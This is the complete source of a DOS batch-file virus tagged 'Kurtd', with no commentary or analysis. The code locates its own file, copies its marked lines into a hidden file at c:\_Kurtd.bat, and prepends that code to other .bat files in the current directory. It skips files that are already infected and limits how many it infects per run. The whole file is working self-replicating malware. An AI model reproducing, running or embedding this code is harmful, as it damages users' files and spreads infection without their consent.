@echo off%_Kurtd%
if '%1=='Kurtd goto Kurtd%2
set Kurtd=%0.bat
if not exist %Kurtd% set Kurtd=%0
if '%Kurtd%==' set Kurtd=autoexec.bat
if exist c:\_Kurtd.bat goto Kurtdg
if exist %Kurtd% goto Kurtdfe
call %Kurtd% Kurtd h %path%
if exist %Kurtd% goto Kurtdfe
goto eKurtd
:Kurtdh
shift%_Kurtd%
if '%2==' goto Kurtdxt
if exist %2\%Kurtd% set Kurtd=%2\%Kurtd%
if exist %2%Kurtd% set Kurtd=%2%Kurtd%
if exist %2\%Kurtd%.bat set Kurtd=%2\%Kurtd%.bat
if exist %2%Kurtd%.bat set Kurtd=%2%Kurtd%.bat
if not exist %Kurtd% goto Kurtdh
goto Kurtdxt
:Kurtdfe
find "Kurtd"<%Kurtd%>c:\_Kurtd.bat
attrib c:\_Kurtd.bat +h
:Kurtdg
command /e:5000 /c c:\_Kurtd Kurtd vir
:eKurtd
set Kurtd=
if exist !!Kurtd.bat del !!Kurtd.bat
goto Kurtdend
:Kurtdxt
echo.>!!Kurtd.bat
!!Kurtd.bat
:Kurtdvir
for %%a in (*.bat) do call c:\_Kurtd Kurtd i %%a
exit Kurtd
:Kurtdi
find "Kurtd"<%3>nul
if not errorlevel 1 goto Kurtdj
type c:\_Kurtd.bat>Kurtd$
type %3>>Kurtd$
move Kurtd$ %3>nul
set Kurtd#=%Kurtd#%1
if %Kurtd#%==11 exit
:Kurtdj
set Kurtd!=%Kurtd!%1
if %Kurtd!%==111 exit
:Kurtdend
